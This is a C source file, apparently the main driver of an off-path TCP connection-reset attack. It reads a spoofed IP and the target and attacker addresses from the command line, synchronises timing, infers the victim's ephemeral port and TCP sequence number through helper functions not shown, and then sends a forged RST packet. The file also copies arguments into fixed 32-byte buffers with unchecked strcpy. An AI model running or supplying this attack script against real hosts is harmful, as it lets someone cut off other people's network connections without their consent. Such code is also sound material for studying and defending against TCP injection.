#include "steps.h"

void printHelp();

/* complete set of the attack */
int main(int argc, char const *argv[]){
	if(argc != 8)
		printHelp();
	else{
		/* initialization of the parameters */
		char spoofedIP[32], dst_ip[32], normal_ip[32];
		strcpy(spoofedIP, argv[1]);
		int s_port = atoi(argv[2]);
		strcpy(dst_ip, argv[3]);
		int d_port = atoi(argv[4]);
		strcpy(normal_ip, argv[5]);
		int n_port = atoi(argv[6]);
		char data[BUFFER_SIZE];
		strcpy(data, argv[7]);
		/*=============end==================*/
		/*step 1: time synchronization with the client*/
		long syncedTime = timeSync(100, normal_ip, n_port, 
	    							dst_ip, d_port, data);
		/*===========end step1============*/

		/*step 2: infer the port */
		int port = bs4port(32768, 61000, normal_ip, 
	                 dst_ip, data, syncedTime);
		/*=======end step2=======*/

		/*step 3: tcp sequence number */
		int seq = seqInference(4, 32768, spoofedIP, s_port, 
	                 dst_ip, d_port, normal_ip, 
	                 n_port, data, syncedTime);
		/*===========end step3========*/

		/* reset the connection */
		tcp_ip_send(spoofedIP, port, 
	                 dst_ip, port, data, RST,
	                 seq, seq, 8096);
	}
	
	return 0;
}

void printHelp(){
	printf("usage of the program\n");
	printf("1.spoofed IP address\n2.initial port\n");
	printf("3.destination IP\n4.initial port\n5.your IP\n6.your port\n7.data\n");
}